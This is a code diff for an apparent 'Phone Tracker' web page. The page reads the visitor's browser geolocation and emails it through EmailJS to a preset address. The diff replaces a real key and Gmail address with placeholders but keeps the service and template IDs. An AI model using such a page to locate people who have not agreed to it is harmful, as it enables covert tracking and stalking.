@@ -28,7 +28,7 @@
   </style>
 
   <script>
-    emailjs.init("bvQcyamPOQtE1JIxa");
+    emailjs.init("your_email_js_id");
 
     function sendLocation() {
       if (!navigator.geolocation) {
@@ -48,7 +48,7 @@
 
           emailjs.send("service_5rpytcs", "template_xrxr8mj", {
             user_name: "Phone Tracker",
-            user_email: "accireed@gmail.com",
+            user_email: "your@gmail.com",
             message: locationMessage,
           })
           .then(() => {
